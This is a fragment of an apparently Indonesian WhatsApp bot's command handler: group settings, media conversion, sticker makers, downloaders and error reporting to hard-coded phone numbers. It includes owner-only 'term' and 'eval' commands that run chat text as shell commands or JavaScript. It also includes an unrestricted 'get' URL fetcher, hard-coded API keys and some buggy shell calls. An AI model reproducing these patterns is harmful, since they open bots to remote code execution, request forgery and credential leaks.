} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'antilink':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
antilink.splice(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'tiktokauto':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAutoDownTT) return reply('Auto download tiktok sudah aktif')
auto_downloadTT.push(from)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mengaktifkan auto download tiktok')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAutoDownTT) return reply('Auto download tiktok belum aktif')
auto_downloadTT.splice(from)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mematikan auto download tiktok')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'demote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @@${sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'infogc':
case 'infogrup':
case 'infogroup':
if (!isGroup) return reply(mess.OnlyGrup)
let cekgcnya =`*INFO GROUP*

• *ID:* ${from}
• *Name:* ${groupName}
• *Member:* ${groupMembers.length}
• *Total Admin:* ${groupAdmins.length}
• *Welcome:* ${isWelcome? "aktif":"tidak"}
• *Antilink:* ${isAntiLink? "aktif":"tidak"}
• *Tiktok Auto:* ${isAutoDownTT? "aktif":"tidak"}`
reply(cekgcnya)
break
case 'text_grup':{
const reactionMessage = { react: { text: "🗿", key: msg.key}}
conn.sendMessage(from, reactionMessage)
}
break
case 'tourl': case 'upload':
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./${sender.split("@")[0]}.webp`)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let buffer_up = fs.readFileSync(`./${sender.split("@")[0]}.webp`)
var rand2 = getRandom('.webp')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Sticker`
conn.sendMessage(from, {text:teks}, {quoted:ftextt})
sleep(3000)
fs.unlinkSync(`./${sender.split("@")[0]}.webp`)
fs.unlinkSync(rand2)
} else if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./${sender.split("@")[0]}.mp4`)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let buffer_up = fs.readFileSync(`./${sender.split("@")[0]}.mp4`)
var rand2 = getRandom('.mp4')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Video`
conn.sendMessage(from, {text:teks}, {quoted:ftextt})
sleep(3000)
fs.unlinkSync(`./${sender.split("@")[0]}.mp4`)
fs.unlinkSync(rand2)
} else if (isImage || isQuotedImage){
var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./${sender.split("@")[0]}.jpg`)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let buffer_up = fs.readFileSync(mediany)
var rand2 = getRandom('.png')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Image`
conn.sendMessage(from, {text:teks}, {quoted:ftextt})
sleep(3000)
fs.unlinkSync(mediany)
fs.unlinkSync(rand2)
} else if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./${sender.split("@")[0]}.mp3`)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let buffer_up = fs.readFileSync(`./${sender.split("@")[0]}.mp3`)
var rand2 = getRandom('.mp3')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Audio`
conn.sendMessage(from, {text:teks}, {quoted:ftextt})
sleep(3000)
fs.unlinkSync(`./${sender.split("@")[0]}.mp3`)
fs.unlinkSync(rand2)
} else {
reply(`*reply audio/video/sticker/gambar dengan pesan ${prefix+command}*`)
}
break
case 'tomp3':
case 'toaudio':
if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./${sender.split("@")[0]}.mp4`)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var media = fs.readFileSync(`./${sender.split("@")[0]}.mp4`)
let ran = getRandom('.mp3')
fs.writeFileSync(`./${ran}`, media)
exec(`ffmpeg -i ${media} ${ran}`)
conn.sendMessage(from, { audio: fs.readFileSync(ran),mimetype: 'audio/mpeg', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: ftextt })
sleep(3000)
fs.unlinkSync(ran)
fs.unlinkSync(media)
} else {
reply(`*Reply video dengan pesan ${prefix+command}*`)
}
break

// CONVERT
case 'toimg': case 'toimage':
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./${sender.split("@")[0]}.webp`)
let buffer = fs.readFileSync(`./${sender.split("@")[0]}.webp`)
var rand1 = getRandom('.webp')
var rand2 = getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
sleep(3000)
fs.unlinkSync(`./${rand1}`)
if (err) return reply(mess.error.api)
conn.sendMessage(from, {caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: ftextt })
sleep(3000)
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(`./${sender.split("@")[0]}.webp`)
})
} else {
reply('*Reply sticker nya dengan pesan #toimg*\n\n*Atau bisa sticker gif dengan pesan #tovideo*')
}
break
case 'tomp4': case 'tovideo':
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./${sender.split("@")[0]}.webp`)
let buffer = `./${sender.split("@")[0]}.webp`
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let webpToMp4 = await webp2mp4File(buffer)
conn.sendMessage(from, { video: {url:webpToMp4.result}, caption: 'Convert Webp To Video'}, { quoted: ftextt })
sleep(3000)
fs.unlinkSync(buffer)
} else {
reply('*Reply sticker gif dengan pesan #tovideo*')
}
break
case 'smeme':
case 'stikermeme':
case 'stickermeme':
case 'memestiker':
var atas = q.split('|')[0]
var bawah = q.split('|')[1]
if (!atas) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (!bawah) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (isImage || isQuotedImage){
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./${sender.split('@')[0]}.jpg`)
var media_url = (await UploadFileUgu(media)).url
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
var opt = { packname: global.ownerName, author: '' }
conn.sendImageAsSticker(from, meme_url, msg, opt)
sleep(3000)
fs.unlinkSync(media)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
}
break
case 'swm':
case 'stikerwm':
case 'stickerwm':
case 'takesticker':
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./${sender.split("@")[0]}.jpeg`)
var opt = { packname: `${global.botName}`, author: `${ownerName}` }
conn.sendImageAsSticker(from, media, msg, opt)
sleep(3000)
fs.unlinkSync(media)
} else if (isVideo || isQuotedVideo) {
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./${sender}.jpeg`)
var opt = { packname: `${global.botName}`, author: `${ownerName}` }
conn.sendImageAsSticker(from, media, msg, opt)
sleep(3000)
fs.unlinkSync(media)
} else {
reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!quoted) return conn.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (/image/.test(quoted)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(from, media, msg, { packname: `${global.botName}`, author: `${ownerName}` })
sleep(3000)
await fs.unlinkSync(encmedia)
} else if (/video/.test(quoted)) {
if ((quoted.msg || quoted).seconds > 11) return conn.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(from, media, conn, { packname: `${global.botName}`, author: `${ownerName}` })
sleep(3000)
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'sgif':
case 'stickergif':
case 'stikergif':
if (isVideo && msg.message.videoMessage.seconds < 10 || isQuotedVideo && quotedMsg.videoMessage.seconds < 10) {
await conn.downloadAndSaveMediaMessage(msg, "video", `./${sender.split("@")[0]}.mp4`)
let buffer = fs.readFileSync(`./${sender.split("@")[0]}.mp4`)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var rand1 = getRandom('.mp4')
var rand2 = getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: ftextt })
sleep(3000)
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(buffer)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
} else {
reply(`Kirim video dengan caption ${prefix+command} atau balas video yang sudah dikirim`)
}
break
case 'dadu':
case 'patrick':
case 'amongus':
case 'gawrgura':
case 'anjing':
case 'bucinstick':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let buffer = `https://api.lolhuman.xyz/api/sticker/${command}?apikey=b84205bf4175a96a338a15af`
conn.sendMessage(from, { sticker:{url:buffer}, mimetype:'image/webp'}, { quoted: ftextt })
}
break
case 'tiktok':{
if (!q) return reply('contoh :\n#tiktok https://vt.tiktok.com/ZSRG695C8/')
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${q}&apikey=dyJhXvqe`)
.then(tt_res => {
reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

𝘼𝙪𝙩𝙝𝙤𝙧: ${global.ownerName}
𝙅𝙪𝙙𝙪𝙡: ${tt_res.result.judul}
𝙎𝙤𝙪𝙧𝙘𝙚: ${q}

Video sedang dikirim...`)
conn.sendMessage(from,{video:{url:tt_res.result.video.link2}, caption:'No Watermark!'}, {quotes:msg})
}).catch((err) => {
reply('Terjadi Kesalahan!!\nUrl tidak valid')
})
}
break
case 'ai':{
if (!q) return reply('Teks?')
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var simi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
var sami = simi.success
reply(`_${sami}_`)}
break
case 'get':{
if(!q) return reply('linknya?')
const reactionMessage = { react: { text: "✨", key: msg.key}}
conn.sendMessage(from, reactionMessage)
fetch(`${args[0]}`).then(res => res.text())  
.then(bu =>{
conn.sendMessage(from, { text: bu }, { quoted: ftextt })
})  
} 
break
case 'term':{
if (!isOwner) return reply('lu spa?')
if (!q) return reply('isi quoted?')
const reactionMessage = { react: { text: "✨", key: msg.key}}
conn.sendMessage(from, reactionMessage)
exec(q, (err, stdout) => {
if (err) return reply(`@Ryuuzxy:\n${err}`)
if (stdout) {
reply(stdout)
}
})
}
break 
case 'eval':{
const reactionMessage = { react: { text: "🐉", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!isOwner) return reply('lu spa?')
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
}
break
default:
}
} catch (err) {
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const jam = moment.tz('asia/Makassar').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Makassar").format("ll")
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
const body = chats.startsWith(prefix) ? chats : ''
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()

console.log(color('[ ERROR ]', 'red'), err)
server_eror.push({"error": `${err}`})
var txterr = `*- [ ERROR SERVER ] -*\n\n*> Command:*\n${command}\n\n*> Waktu:*\n${jam}\n\n*> Tanggal:*\n${tanggal}\n\n*> No. Request:*\nwa.me/${sender.split("@")[0]}\n\n${err}`
conn.sendMessage("6285298256587@s.whatsapp.net", { text : txterr}, { quoted: ftextt })
conn.sendMessage("628990951073@s.whatsapp.net", { text : txterr}, { quoted: ftextt })
conn.sendMessage("62895630786584@s.whatsapp.net", { text : txterr}, { quoted: ftextt })
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
}
}